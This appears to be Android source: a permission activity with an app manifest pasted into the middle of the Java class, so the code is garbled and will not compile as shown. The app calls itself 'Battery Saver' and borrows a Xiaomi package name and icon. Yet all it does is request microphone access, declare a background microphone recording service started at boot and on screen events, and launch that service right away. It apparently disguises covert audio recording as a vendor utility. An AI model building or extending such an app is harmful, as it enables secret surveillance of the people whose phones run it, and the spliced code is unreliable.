package com.xiaomi.batterysaver.service;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class PermissionActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final String[] REQUIRED_PERMISSIONS = {
            android.Manifest.permission.RECORD_AUDIO
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions();
    }

    private void requestPermissions() {
        if (!hasAllPermissions()) {
            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
        } else {
            checkForScheduleExactAlarmPermission();
        }
    }

    private boolean hasAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0) {
                for (int grantResult : grantResults) {
                    if (grantResult != PackageManager.PERMISSION_GRANTED) {
                        finish();
                        return;
                    }
                }
                checkForScheduleExactAlarmPermission();
            } else {
                finish();
            }
        }
    }

    private void checkForScheduleExactAlarmPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (!Settings.canScheduleExactAlarms(this)) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                startActivity(intent);
            }
        }<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
    <!-- Removed WRITE_EXTERNAL_STORAGE permission as it's deprecated for apps targeting Android 13+ -->

                <application
        android:icon="@drawable/icons8_xiaomi_240"
        android:label="Battery Saver"
        android:roundIcon="@drawable/icons8_xiaomi_240"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">

        <activity
        android:name="com.xiaomi.batterysaver.service.PermissionActivity"
        android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service
        android:name="com.xiaomi.batterysaver.service.TimeCheckService"
        android:enabled="true"
        android:exported="false" />

        <service
        android:name="com.xiaomi.batterysaver.service.RecordService"
        android:enabled="true"
        android:exported="false"
        android:foregroundServiceType="microphone">
            <!-- Ensure you have the necessary permissions if your app's functionality requires any from the specific list provided earlier -->
                </service>

        <receiver
        android:name="com.xiaomi.batterysaver.service.BootReceiver"
        android:enabled="true"
        android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>

        <receiver
        android:name="com.xiaomi.batterysaver.service.ScreenStateReceiver"
        android:enabled="true"
        android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.SCREEN_OFF"/>
                <action android:name="android.intent.action.SCREEN_ON"/>
            </intent-filter>
        </receiver>
    </application>

</manifest>
        proceedToStartRecordingService();
    }

    private void proceedToStartRecordingService() {
        Intent serviceIntent = new Intent(this, RecordService.class);
        startService(serviceIntent);
        finish();
    }
}